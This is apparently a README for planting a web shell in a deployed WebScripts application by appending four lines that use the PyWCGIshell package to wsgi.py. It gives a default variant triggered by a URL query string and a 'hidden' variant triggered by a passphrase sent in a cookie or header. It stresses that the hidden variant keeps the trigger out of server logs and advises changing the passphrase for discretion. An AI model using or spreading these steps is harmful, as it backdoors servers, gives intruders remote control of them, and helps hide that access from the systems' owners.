# WebScripts WebShell

## Description

Install a WebShell on hardened and deployed WebScripts (using Apache and mod_wsgi).

[![WebShell on WebScripts - Youtube]()]()

*WebShell on WebScripts - Youtube*

## Steps

### Install

Install requirements in virtualenv:
```bash
pip install PyWCGIshell
```

### Write code

Add 4 lines to the end of the `wsgi.py` file.

#### Default WebShell

```python
from PyWCGIshell import WebShell
webshell = WebShell(type_="wsgi")
webshell.standard_page = application
application = webshell.run
```

 - To use the WebShell add `?$HELL` to the end of the URL
 - The `$HELL` in the query string is visible in the logs, i do not recommend using the default WebShell configuration.

#### Hidden WebShell

```python
from PyWCGIshell import WebShell
webshell = WebShell(type_="wsgi", passphrase="azerty", pass_type="header_value")
webshell.standard_page = application
application = webshell.run
```

 - To use the WebShell add `azerty` in a header value (for example in a cookie, in the javascript console: `document.cookie="azerty"`) and reload the page
 - The value of the cookie is not visible in the logs
 - You should change the passphrase for more discretion
